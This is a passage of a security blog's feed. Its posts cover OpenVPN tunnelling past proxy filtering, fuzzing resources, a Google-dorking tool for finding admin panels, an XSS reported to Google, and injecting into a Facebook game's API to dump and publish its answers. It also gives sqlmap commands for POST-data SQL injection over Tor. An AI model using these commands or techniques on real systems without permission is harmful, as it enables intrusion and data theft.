&lt;li&gt;Install OpenVPN on VPS :P - Generate required certs &amp;amp; keys for the server &amp;amp; one client ( &lt;a href="https://wiki.archlinux.org/index.php/OpenVPN#Create_a_Public_Key_Infrastructure_.28PKI.29_from_scratch"&gt;Help here&lt;/a&gt; )&lt;/li&gt;
&lt;li&gt;Edit the configuration files for both server &amp;amp; client. ( &lt;a href="https://wiki.archlinux.org/index.php/OpenVPN#A_basic_L3_IP_routing_configuration"&gt;Again help here&lt;/a&gt; )&lt;/li&gt;
&lt;li&gt;Start the openvpn server &amp;amp; try to connect from the client as suggested in the arch wiki.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;NOTE:&lt;/strong&gt; If you are behind a &lt;strong&gt;HTTP Proxy&lt;/strong&gt; with &lt;strong&gt;basic or ntlm&lt;/strong&gt; auth, then you can follow the steps &lt;a href="http://openvpn.net/index.php/open-source/documentation/howto.html#http"&gt;here&lt;/a&gt;)&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;If everything goes fine, now you must be able to connect to your openvpn server through http proxy.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Now comes the real part, with the help of openvpn we have the facility to redirect all network traffic through VPN. So if we could somehow make  the server redirect this traffic towards internet, there will be no  need to use proxy settings with all the applications in the client :).&lt;/p&gt;
&lt;p&gt;For non-geeks:-&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Follow &lt;a href="http://openvpn.net/index.php/open-source/documentation/howto.html#redirect"&gt;this guide&lt;/a&gt; for adding directives in configuration files to route all client traffic through VPN.&lt;/li&gt;
&lt;li&gt;Finally, on the Arch VPS enable redirection of traffic with the help of &lt;a href="https://wiki.archlinux.org/index.php/OpenVPN#L2_Ethernet_bridging"&gt;this guide&lt;/a&gt;. ( Be careful with iptables as &lt;strong&gt;MASQUERADE&lt;/strong&gt; doesn't work with OpenVZ vps )&lt;/li&gt;
&lt;li&gt;Now you must be able to connect to internet through your VPN, when your vpn is active.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;So there is no need to define proxy settings anywhere else because all the traffic is routed through VPN.&lt;/p&gt;
&lt;p&gt;Happy ending to the story :-&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;No need for any proxy settings anywhere else except for vpn client conf.&lt;/li&gt;
&lt;li&gt;All the data is encrypted so that eavesdropping &amp;amp; filtering is prevented.&lt;/li&gt;
&lt;li&gt;No need to use Tor Anonymity network, whose exit nodes are banned in many places.&lt;/li&gt;
&lt;/ul&gt;</content><category term="tricks"></category><category term="linux"></category></entry><entry><title>Google Summer of Code 2013 with OWASP OWTF</title><link href="https://tunnelshade.in/blog/2013/09/owtf-inbound-proxy-in-gsoc-2013/" rel="alternate"></link><published>2013-09-09T00:00:00+05:30</published><updated>2013-09-09T00:00:00+05:30</updated><author><name>Bharadwaj Machiraju</name></author><id>tag:tunnelshade.in,2013-09-09:/blog/2013/09/owtf-inbound-proxy-in-gsoc-2013/</id><summary type="html">&lt;p&gt;I always feel like my selection in GSoC 2013 was all magic because of the fact that I was
completely unaware about the presence of infosec community in GSoC. I contacted
&lt;a href="http://blog.7-a.org"&gt;&lt;strong&gt;Abraham Aranguren&lt;/strong&gt;&lt;/a&gt;, the project leader for &lt;strong&gt;OWASP Offensive Web Testing Framework&lt;/strong&gt;.
He was very helpful throughout the gruelsome process â€¦&lt;/p&gt;</summary><content type="html">&lt;p&gt;I always feel like my selection in GSoC 2013 was all magic because of the fact that I was
completely unaware about the presence of infosec community in GSoC. I contacted
&lt;a href="http://blog.7-a.org"&gt;&lt;strong&gt;Abraham Aranguren&lt;/strong&gt;&lt;/a&gt;, the project leader for &lt;strong&gt;OWASP Offensive Web Testing Framework&lt;/strong&gt;.
He was very helpful throughout the gruelsome process of making a proposal. Thanks to him,
the proposal turned out to be like &lt;a href="http://www.google-melange.com/gsoc/proposal/review/google/gsoc2013/tunnelshade/5785905063264256"&gt;&lt;strong&gt;this&lt;/strong&gt;&lt;/a&gt;.
My proposal got selected and my mentor advised me to do some pre-implementation research
so that I face less problems in the future.&lt;/p&gt;
&lt;p&gt;My pre-implementaion research is present &lt;a href="https://docs.google.com/document/d/1_iaOYaiSya83uxiecYhCJYBwQPubCWs463DJebNOqcQ/"&gt;&lt;strong&gt;here&lt;/strong&gt;&lt;/a&gt;.
So based on the results I started implementing my GSoC project. After implementation, I did
some benchmarks which are available &lt;a href="https://docs.google.com/document/d/1TdV667Uh3Fq272Wl8upzWi3c45-8E1tTVLcYPmc6yPM/"&gt;&lt;strong&gt;here&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Finally, I successfully completed my GSoC 2013 project. Some points to keep in mind :&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Start early so that you get good amount of time to fine tune your proposal.&lt;/li&gt;
&lt;li&gt;Get your proposal reviewed by someone, a different perspective always helps.&lt;/li&gt;
&lt;li&gt;Try to do some research and include those results in your proposal.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Contribute to the project beforehand (atleast an issue fix)&lt;/strong&gt;. This will attest your skill with the project.&lt;/li&gt;
&lt;li&gt;Code happily and receive a nice paycheck :).&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;NOTE: GSoC 2013 has been a boon for me as I met people whom I would have missed probably.
GSoC will give you a great open-source project to contribute&lt;/strong&gt;&lt;/p&gt;</content><category term="tools"></category><category term="owtf"></category></entry><entry><title>Plug-n-Hack support in OWTF</title><link href="https://tunnelshade.in/blog/2013/08/plug-n-hack-support-in-owtf-d/" rel="alternate"></link><published>2013-08-26T00:00:00+05:30</published><updated>2013-08-26T00:00:00+05:30</updated><author><name>Bharadwaj Machiraju</name></author><id>tag:tunnelshade.in,2013-08-26:/blog/2013/08/plug-n-hack-support-in-owtf-d/</id><summary type="html">&lt;p&gt;&lt;strong&gt;Plug-n-Hack&lt;/strong&gt; (PnH) is a proposed standard from the Mozilla security team
for defining how security tools can interact with browsers in a more
useful and usable way. More info about PnH can be found in this &lt;a href="https://blog.mozilla.org/security/2013/08/22/plug-n-hack/"&gt;blog post&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;The interesting thing is that &lt;strong&gt;OWTF&lt;/strong&gt; now supports this standard and below â€¦&lt;/p&gt;</summary><content type="html">&lt;p&gt;&lt;strong&gt;Plug-n-Hack&lt;/strong&gt; (PnH) is a proposed standard from the Mozilla security team
for defining how security tools can interact with browsers in a more
useful and usable way. More info about PnH can be found in this &lt;a href="https://blog.mozilla.org/security/2013/08/22/plug-n-hack/"&gt;blog post&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;The interesting thing is that &lt;strong&gt;OWTF&lt;/strong&gt; now supports this standard and below you can find a mini guide on getting things going.&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Currently Firefox supports PnH through &lt;strong&gt;FxPnH add-on&lt;/strong&gt;, so you must have it installed( Add-on can be downloaded from &lt;a href="https://github.com/mozmark/ringleader"&gt;here&lt;/a&gt; ).&lt;/li&gt;
&lt;li&gt;Make sure you have the latest copy of OWTF ;) , start owtf along with &lt;strong&gt;--proxy flag&lt;/strong&gt;.&lt;/li&gt;
&lt;li&gt;Fire up your &lt;strong&gt;firefox&lt;/strong&gt; &amp;amp; check the console for PnH configuration link.&lt;/li&gt;
&lt;li&gt;Click on the setup link in the console.
&lt;img alt="PnH Support" src="http://i41.tinypic.com/w20jn4.jpg"&gt;&lt;/li&gt;
&lt;li&gt;You can revert back the proxy settings using this command in &lt;strong&gt;gcli&lt;/strong&gt; (Shift + F2)&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;pnh config clear
&lt;/pre&gt;&lt;/div&gt;


&lt;/li&gt;
&lt;/ol&gt;</content><category term="owtf"></category></entry><entry><title>Way to fuzz (I learnt it this way :P)</title><link href="https://tunnelshade.in/blog/2013/08/way-to-fuzz-i-learnt-it-this-way-p/" rel="alternate"></link><published>2013-08-19T00:00:00+05:30</published><updated>2013-08-19T00:00:00+05:30</updated><author><name>Bharadwaj Machiraju</name></author><id>tag:tunnelshade.in,2013-08-19:/blog/2013/08/way-to-fuzz-i-learnt-it-this-way-p/</id><summary type="html">&lt;p&gt;I had a hard time learning how to fuzz desktop applications and few web
server softwares, because I cannot use google effectively. So I decided
to compile a list for myself.&lt;/p&gt;
&lt;p&gt;Read this &lt;a href="http://www.amazon.com/gp/product/0321446119"&gt;book&lt;/a&gt; if possible, it is super awesome :D&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Best win32 exploit development tutorials - &lt;a href="https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/"&gt;corelan&lt;/a&gt;
 ( Because there is â€¦&lt;/li&gt;&lt;/ul&gt;</summary><content type="html">&lt;p&gt;I had a hard time learning how to fuzz desktop applications and few web
server softwares, because I cannot use google effectively. So I decided
to compile a list for myself.&lt;/p&gt;
&lt;p&gt;Read this &lt;a href="http://www.amazon.com/gp/product/0321446119"&gt;book&lt;/a&gt; if possible, it is super awesome :D&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Best win32 exploit development tutorials - &lt;a href="https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/"&gt;corelan&lt;/a&gt;
 ( Because there is no fun in fuzzing when you don't know how to develop
 an exploit, unless you wish to do it to report some bugs :P )&lt;/li&gt;
&lt;li&gt;The fuzzers (or) fuzzer frameworks I used :- &lt;a href="http://peachfuzzer.com/"&gt;peach&lt;/a&gt;, &lt;a href="http://www.immunitysec.com/resources-freesoftware.shtml"&gt;spike&lt;/a&gt;, &lt;a href="http://nullsecurity.net/tools/fuzzer/uniofuzz.py"&gt;uniofuzz&lt;/a&gt;, &lt;a href="https://code.google.com/p/sickfuzz/"&gt;sickfuzz&lt;/a&gt;.&lt;/li&gt;
&lt;li&gt;I preffered peach because I like the idea of models.&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Best tutorials online for using peach fuzzer (or) making peach pit files :-&amp;nbsp;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href="http://peachfuzzer.com/v3/PeachQuickStart.html"&gt;http://peachfuzzer.com/v3/PeachQuickStart.html&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.flinkd.org/2011/07/fuzzing-with-peach-part-1/"&gt;http://www.flinkd.org/2011/07/fuzzing-with-peach-part-1/ &lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://peachfuzzer.com/v3/PeachPit.html"&gt;http://peachfuzzer.com/v3/PeachPit.html&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.nullthreat.net/2011/01/fuzzing-with-peach-install-part-1.html"&gt;http://www.nullthreat.net/2011/01/fuzzing-with-peach-install-part-1.html &lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</content><category term="tricks"></category><category term="info"></category></entry><entry><title>Signing an SSL cert using PyOpenSSL</title><link href="https://tunnelshade.in/blog/2013/06/sign-using-pyopenssl/" rel="alternate"></link><published>2013-06-14T00:00:00+05:30</published><updated>2013-06-14T00:00:00+05:30</updated><author><name>Bharadwaj Machiraju</name></author><id>tag:tunnelshade.in,2013-06-14:/blog/2013/06/sign-using-pyopenssl/</id><summary type="html">&lt;p&gt;While I was doing my GSOC 13 project, I came across a situation which involves
generation and signing of certificates on fly using a custom CA. So I searched
the web and could only find outdated examples. I decided to share my script if
anyone wishes to get some kind â€¦&lt;/p&gt;</summary><content type="html">&lt;p&gt;While I was doing my GSOC 13 project, I came across a situation which involves
generation and signing of certificates on fly using a custom CA. So I searched
the web and could only find outdated examples. I decided to share my script if
anyone wishes to get some kind of kickstart. I added comments as per peoples' requests :P&lt;/p&gt;
&lt;p&gt;{% gist 5779960 %}&lt;/p&gt;</content><category term="tricks"></category><category term="python"></category></entry><entry><title>Skipfish through a proxy</title><link href="https://tunnelshade.in/blog/2013/05/skipfish-through-proxy/" rel="alternate"></link><published>2013-05-29T00:00:00+05:30</published><updated>2013-05-29T00:00:00+05:30</updated><author><name>Bharadwaj Machiraju</name></author><id>tag:tunnelshade.in,2013-05-29:/blog/2013/05/skipfish-through-proxy/</id><summary type="html">&lt;p&gt;My recent use of skipfish for benchmarking some proxies left me
searching for a way to route skipfish requests through a proxy server.
After searching the web for few frantic moments, I understood that there
are two approaches to solve this problem.&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;To recompile skipfish after enabling the proxy feature â€¦&lt;/strong&gt;&lt;/p&gt;&lt;/li&gt;&lt;/ol&gt;</summary><content type="html">&lt;p&gt;My recent use of skipfish for benchmarking some proxies left me
searching for a way to route skipfish requests through a proxy server.
After searching the web for few frantic moments, I understood that there
are two approaches to solve this problem.&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;To recompile skipfish after enabling the proxy feature&lt;/strong&gt; :-&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Open &lt;strong&gt;skipfish/src/config.h&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;Uncomment line &lt;strong&gt;67&lt;/strong&gt;. Now it should read as &lt;strong&gt;&lt;em&gt;#define PROXY_SUPPORT 1&lt;/em&gt;&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;Save the file.&lt;/li&gt;
&lt;li&gt;Use the command &lt;strong&gt;make &lt;/strong&gt;in the main folder to recompile skipfish.&lt;/li&gt;
&lt;li&gt;Now you can provide a proxy address using &lt;strong&gt;-J&lt;/strong&gt; ( check ./skipfish --help )&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;The second way is to use burp or zap as proxifiers&lt;/strong&gt;. Follow the article present &lt;a href="http://vanstechelman.eu/security/using_skipfish_through_burpsuite"&gt;here&lt;/a&gt;.&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;EDIT :- If you get a pcre.h error then install libpcre3-dev&lt;/p&gt;</content><category term="tricks"></category><category term="tools"></category></entry><entry><title>thedumpster := Targeted Google dorking</title><link href="https://tunnelshade.in/blog/2013/04/google-dorking-against-a-domain/" rel="alternate"></link><published>2013-04-06T00:00:00+05:30</published><updated>2013-04-06T00:00:00+05:30</updated><author><name>Bharadwaj Machiraju</name></author><id>tag:tunnelshade.in,2013-04-06:/blog/2013/04/google-dorking-against-a-domain/</id><summary type="html">&lt;h4&gt;Installation&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;Download the latest version from &lt;a href="https://github.com/tunnelshade/thedumpster"&gt;here&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;You need &lt;a href="http://python.org/"&gt;python 3&lt;/a&gt; for running this tool.&lt;/li&gt;
&lt;li&gt;&lt;a href="https://pypi.python.org/pypi/pyquery"&gt;PyQuery&lt;/a&gt; is also required for running this tool.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Pyquery can be installed using pip&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;sudo pip install pyquery
&lt;/pre&gt;&lt;/div&gt;


&lt;h4&gt;Configuration&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;First the proxies must be configured in the config file correctly.
Pick some open proxies which â€¦&lt;/li&gt;&lt;/ul&gt;</summary><content type="html">&lt;h4&gt;Installation&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;Download the latest version from &lt;a href="https://github.com/tunnelshade/thedumpster"&gt;here&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;You need &lt;a href="http://python.org/"&gt;python 3&lt;/a&gt; for running this tool.&lt;/li&gt;
&lt;li&gt;&lt;a href="https://pypi.python.org/pypi/pyquery"&gt;PyQuery&lt;/a&gt; is also required for running this tool.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Pyquery can be installed using pip&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;sudo pip install pyquery
&lt;/pre&gt;&lt;/div&gt;


&lt;h4&gt;Configuration&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;First the proxies must be configured in the config file correctly.
Pick some open proxies which use basic http auth or no auth at all. The &lt;strong&gt;username:password&lt;/strong&gt; part must be omitted if not required. Make sure you use only one proxy on one line.&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;username:password@proxy-ip:port
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;Now just go the directory where thedumpster.py exists and run&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;python thedumpster.py --help
&lt;/pre&gt;&lt;/div&gt;


&lt;h4&gt;Usage&lt;/h4&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;usage: thedumpster.py &lt;span class="o"&gt;[&lt;/span&gt;-h&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;-l LIMIT&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;-ghdb&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;-ap&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;-p&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;-a ADD&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;-r REM&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;-ws&lt;span class="o"&gt;]&lt;/span&gt; domain
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;img class="image-center" src="http://i39.tinypic.com/28814d0.jpg" alt="thedumpster"/&gt;&lt;/p&gt;
&lt;h4&gt;Flags / Parameters&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;-l&lt;/strong&gt; : The value provided here will be limit for the number of results that will be returned for your search.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;-ghdb&lt;/strong&gt; : This flag when sets prompts you to select a type of dork from GHDB dorks, which will be tested against the domain.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;-ap&lt;/strong&gt; : This flag when set asks for the possbile backend of the
 web infrastructure. Then based on the backend it picks appropriate
dorks for searching.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;-p&lt;/strong&gt; : This flag allows to search for any pastebin dumps.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;-a&lt;/strong&gt; : This argument allows you to add custom search keywords. Multiple search words must be separated by comma. Eg :- &lt;strong&gt;intext:error,ext:sql&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;-r&lt;/strong&gt; : This argument allows you to exclude search results of a
site. Multiple domain exclusion can be done by separating those domains
with a comma. Eg:- &lt;strong&gt;foo.bar.com,shut.bar.com&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;-ws&lt;/strong&gt; : The most important flag of all. This flag allows you to
 do google search which is against Google's TOS. So author is not
responsible for your usage.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;domain&lt;/strong&gt; : This is a compulsory positional argument. Better to
provide the root domain so that all subdomains are included in search
results.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;For example if we wish to search a site &lt;strong&gt;example.com&lt;/strong&gt; , for &lt;strong&gt;admin panels&lt;/strong&gt; while excluding sites &lt;strong&gt;foo.example.com&lt;/strong&gt;, and extra query &lt;strong&gt;intext:login&lt;/strong&gt; then you can use something like this&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;python thedumpster.py -l &lt;span class="m"&gt;10&lt;/span&gt; -ap -a intext:login -r foo.example.com example.com
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;strong&gt;P.S&lt;/strong&gt; The -ws flag is not taken by default&lt;/p&gt;</content><category term="tools"></category><category term="screenshots"></category></entry><entry><title>XSS in Google 500 Error page</title><link href="https://tunnelshade.in/blog/2013/03/xss-in-google/" rel="alternate"></link><published>2013-03-28T00:00:00+05:30</published><updated>2013-03-28T00:00:00+05:30</updated><author><name>Bharadwaj Machiraju</name></author><id>tag:tunnelshade.in,2013-03-28:/blog/2013/03/xss-in-google/</id><summary type="html">&lt;p&gt;Due to highly poor internet conditions in my university, we often encounter google
error pages. But this happened during my winter break when googling some stuff,
I was redirected to a Google 500 error page. What caught my attention was that
arguments were present there but the page was a â€¦&lt;/p&gt;</summary><content type="html">&lt;p&gt;Due to highly poor internet conditions in my university, we often encounter google
error pages. But this happened during my winter break when googling some stuff,
I was redirected to a Google 500 error page. What caught my attention was that
arguments were present there but the page was a html page. So I thought of viewing
the source and I saw that, just some regex matching using javascript was done to
extract those parameters. The parameters were being passed as a link in the page.
I tried XSS and it  worked out. The awkward thing was that they never tried to filter
the url, when the request was being sent to their server. Then I reported it to Google.
May be they were in their winter break, so they took some time to respond. But atlast
they responded and google rewarded me with $1337.&lt;/p&gt;
&lt;p&gt;&lt;img class="image-center" src="http://i39.tinypic.com/2csewls.jpg" alt="XSS in Google"/&gt;&lt;/p&gt;</content><category term="hacks"></category><category term="info"></category></entry><entry><title>Facebook games are fun .... to hack!</title><link href="https://tunnelshade.in/blog/2013/03/logo-game-hacked/" rel="alternate"></link><published>2013-03-26T00:00:00+05:30</published><updated>2013-03-26T00:00:00+05:30</updated><author><name>Bharadwaj Machiraju</name></author><id>tag:tunnelshade.in,2013-03-26:/blog/2013/03/logo-game-hacked/</id><summary type="html">&lt;p&gt;This is about how I learnt about logos with the help of a facebook game named &lt;strong&gt;The Logo Game&lt;/strong&gt;.
During vacation because of extreme boredom in holidays, I finally started to look for some time
consuming stuff :P. Eventually I stumbled upon Facebook games in particular a game called The â€¦&lt;/p&gt;</summary><content type="html">&lt;p&gt;This is about how I learnt about logos with the help of a facebook game named &lt;strong&gt;The Logo Game&lt;/strong&gt;.
During vacation because of extreme boredom in holidays, I finally started to look for some time
consuming stuff :P. Eventually I stumbled upon Facebook games in particular a game called The Logo Game.&lt;/p&gt;
&lt;p&gt;&lt;img src="http://i43.tinypic.com/2wggoht.jpg" class="image-center" alt="Logo Game"/&gt;&lt;/p&gt;
&lt;p&gt;The game was really cool (at the beginning). But the awkward thing that I noticed is that,
if a correct guess was provided it was taking time to respond &amp;amp; for a wrong guess the
reaction was instantaneous. So, it is reasonable to open tamper data and check for the
data submits. For a correct solution there was a request being done and for wrong as
expected no request was taking place. So I started diving into the source code :). What
caught my attention was ==&amp;gt;&lt;/p&gt;
&lt;p&gt;&lt;img src="http://i40.tinypic.com/8yyrrb.jpg" class="image-center" alt="MD5 Salt"/&gt;&lt;/p&gt;
&lt;p&gt;md5_salt :o ,  so I could guess what was going in the backend. So it was easy for me to search the remaining js code for relavent part &amp;amp; I found this&lt;/p&gt;
&lt;p&gt;&lt;img src="http://i40.tinypic.com/o7rpro.jpg" class="image-center" alt="Guess Function"/&gt;&lt;/p&gt;
&lt;p&gt;So I went for logos.CheckGuess&lt;/p&gt;
&lt;p&gt;&lt;img src="http://i41.tinypic.com/2co4zlu.jpg" class="image-center" alt="Check Function"/&gt;&lt;/p&gt;
&lt;p&gt;Yay!!! We got it, so some hashes were being passed to app, and checking is done in our browser itself (The app was combining the answer with a salt and then hashing it and checking the hash against the existing values ) . So now we have salt and hashes. Are we going to crack it?????
NO WAY. When I tried to replicate the application's way of communicating with the server through ajax, I got the some data in json format. I tried fuzzing the input parameters and I could get the whole data of logos and hashes ( also those which I don't have access as my score is not so good ). So the data after a bit of &lt;strong&gt;injections&lt;/strong&gt; appeared like this =&amp;gt;&lt;/p&gt;
&lt;p&gt;&lt;img src="http://i42.tinypic.com/axd8co.jpg" width="100%" class="image-center" alt="Fuzzing result"/&gt;&lt;/p&gt;
&lt;p&gt;I just underlined few of the data because almost all the data is important. We have hints, md5 hashes and names of the logos. So I wrote a python script to extract logo names from this trash and the output of my program appeared like =&amp;gt;&lt;/p&gt;
&lt;p&gt;&lt;img src="http://i43.tinypic.com/51t4du.jpg" class="image-center" alt="Check Function"/&gt;&lt;/p&gt;
&lt;p&gt;Just a snapshot of a part of the output file. So now I have all the logo names in order. The file is available for download &lt;a href="http://www.mediafire.com/view/?wygcjzqi8auyopx"&gt;here&lt;/a&gt;. Finally there are loads of ways to learn stuff. So I started learning about logos this way.&lt;/p&gt;
&lt;p&gt;P.S - The score that I have in the game is legible and is not obtained through any unfair means :P&lt;/p&gt;
&lt;p&gt;Anyone can download the logos list and verify. Incase of mistakes please let me know as I have to correct my script then :P. Trust me all this was fun rather than the normal game.&lt;/p&gt;</content><category term="tricks"></category><category term="hacks"></category></entry><entry><title>Post Data SQL Injection using SQLMAP</title><link href="https://tunnelshade.in/blog/2013/03/post-data-sql-injection-using-sqlmap/" rel="alternate"></link><published>2013-03-11T00:00:00+05:30</published><updated>2013-03-11T00:00:00+05:30</updated><author><name>Bharadwaj Machiraju</name></author><id>tag:tunnelshade.in,2013-03-11:/blog/2013/03/post-data-sql-injection-using-sqlmap/</id><summary type="html">&lt;p&gt;The best thing about sqlmap is that it is free &amp;amp; you can use it for
SQL INJECTION even for POST data. This post is meant to provide you
a quick look into the options that sqlmap provides for performing
sql injections in post data. For all those who don't know â€¦&lt;/p&gt;</summary><content type="html">&lt;p&gt;The best thing about sqlmap is that it is free &amp;amp; you can use it for
SQL INJECTION even for POST data. This post is meant to provide you
a quick look into the options that sqlmap provides for performing
sql injections in post data. For all those who don't know about sqlmap,
it is a database automated sql injection &amp;amp; database takeover tool :).
If you have some experience using the free version of Havij, then I
urge you to try this tool because this is the best open source tool
(by default it doesnot have any GUI ), but you can get one if you like.
( I suggest you to stick with CLI version ).&lt;/p&gt;
&lt;p&gt;The important arguments that are available for you are -&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;-u&lt;/strong&gt;     : This is the most important parameter, because this is where you give the url where the request is supposed to be made.( For a POST request make sure you give the correct url i.e the place where the corresponding form is posting rather than the page where the form is present :P)&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;--data&lt;/strong&gt;  : When you provide this argument with some data, sqlmap will perform POST requests automatically. The POST data of a request can be written directly, if help needed use some tool like ZAP or Burp Suite or Live HTTP Headers to get the post data&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Some other important arguments that are usefull -&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;--proxy&lt;/strong&gt;  : This is used when you wish to tunnel all your requests through a proxy. The protocol must also be mentioned here.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;--proxy-cred&lt;/strong&gt;  : This is used to provide credentials for proxy server.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;--tor&lt;/strong&gt; : This allows you to use tor anonymity network.( --tor-port &amp;amp; --tor-type are used if these settings are different from the default values )&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;So a command using all these arguments would look like -&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;./sqlmap.py -u &lt;span class="s2"&gt;&amp;quot;URL WHERE THE DATA WILL BE POSTED&amp;quot;&lt;/span&gt; --data&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;POST DATA&amp;quot;&lt;/span&gt; --proxy&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;PROTO://IP:PORT&amp;quot;&lt;/span&gt; --proxy-cred&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;username:password&amp;quot;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;For example if we have a form posting data to &lt;strong&gt;www.example.com/submit.php&lt;/strong&gt; &amp;amp; the data is &lt;strong&gt;search=hello&amp;amp;value=submit&lt;/strong&gt; then the command will look like this - (we are using tor network this time :P)&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;./sqlmap.py -u &lt;span class="s2"&gt;&amp;quot;http://www.example.com/submit.php&amp;quot;&lt;/span&gt; --data&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;search=hello&amp;amp;value=submit&amp;quot;&lt;/span&gt; --tor
&lt;/pre&gt;&lt;/div&gt;</content><category term="tricks"></category><category term="info"></category></entry><entry><title>Firefox addons for hackers</title><link href="https://tunnelshade.in/blog/2012/12/firefox-addons-for-hackers/" rel="alternate"></link><published>2012-12-23T00:00:00+05:30</published><updated>2012-12-23T00:00:00+05:30</updated><author><name>Bharadwaj Machiraju</name></author><id>tag:tunnelshade.in,2012-12-23:/blog/2012/12/firefox-addons-for-hackers/</id><summary type="html">&lt;p&gt;The following is a list of addons that
 I find extremely useful when searching for security loopholes in web
applications using firefox.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://addons.mozilla.org/en-US/firefox/addon/hackbar/"&gt;Hackbar&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;This addon allows us to calculate common types of hashes and provides us
 with some common encryption methods. It also allows us to edit post
data and â€¦&lt;/p&gt;</summary><content type="html">&lt;p&gt;The following is a list of addons that
 I find extremely useful when searching for security loopholes in web
applications using firefox.&lt;/p&gt;
&lt;ul&gt;
